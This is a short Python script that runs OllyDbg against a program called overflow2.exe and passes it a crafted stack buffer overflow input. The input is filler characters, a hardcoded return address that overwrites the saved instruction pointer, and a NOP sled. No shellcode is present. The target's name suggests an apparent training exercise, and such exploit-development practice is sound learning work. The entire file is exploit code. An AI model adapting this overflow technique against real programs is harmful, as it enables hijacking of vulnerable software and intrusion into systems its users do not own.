import os

olly = "OLLYDBG.exe"
target = "overflow2.exe"
input = "AAAAAAAAAABBBBBBBBBBCCCCCCCCCCDDDDDDDDDDDD"
input += "\x3F\xAE\x47\x77"
input += "\x90"*20

cmd = "{0} {1} {2}".format(olly, target, input)
os.system(cmd)
